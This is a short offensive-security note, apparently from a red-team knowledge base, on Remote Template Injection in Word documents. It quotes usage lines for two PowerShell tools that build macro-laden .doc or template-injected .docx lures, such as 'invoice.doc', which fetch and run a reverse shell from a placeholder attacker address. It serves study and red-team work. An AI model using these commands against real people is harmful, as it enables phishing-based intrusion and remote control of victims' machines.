> [!info]
> This note is still in development.

## Overview
---
**Remote Template Injection** is an exploit where an attacker can manipulate or inject templates into a Word document remotely. This vulnerability can be exploited to execute arbitrary code or carry out other malicious activities when the document is opened or processed.

This exploit even allows `.docx` to execute macros, which otherwise wouldn't be possible.

## Example
---

> [!hint]
> My custom reverse shell generator can be found here:
> https://github.com/tylerdotrar/PoorMansArmory
> 
> - PoorMansArmory/officemacros/Get-MacroInfestedWordDoc.ps1
> ```powershell
> # Synopsis:
> # Generate Macro Infested Word 97-2003 Documents (.doc)
> # 
> # Parameters:
> #   -DocumentName   -->  Output name of the malicious Word Document (.doc)
> #   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
> #   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
> #   -Help           -->  Return Get-Help information
> 
> # Example:
> Get-MacroInfestedWordDoc -DocumentName invoice.doc -PayloadURL http://<attacker_ip>/revshell
> ```
>
> - PoorMansArmory/officemacros/Get-TemplateInjectedPayload.ps1
> ```powershell
> # Synopsis:
> # Generate Macro Infested Word Template (.dotm) an Inject into a Word Document (.docx)
> # 
> # Parameters:
> #   -TemplateURL    -->  URL where the malicious Word Template (.dotm) will be hosted
> #   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
> #   -Document       -->  Advanced: Target templated Word Document (.docx) to inject
> #   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
> #   -Help           -->  Return Get-Help information
> 
> # Example:
> Get-TemplateInjectedPayload -TemplateURL http://<attacker_ip>/office/update.dotm -PayloadURL http://<attacker_ip>/revshell
> ```

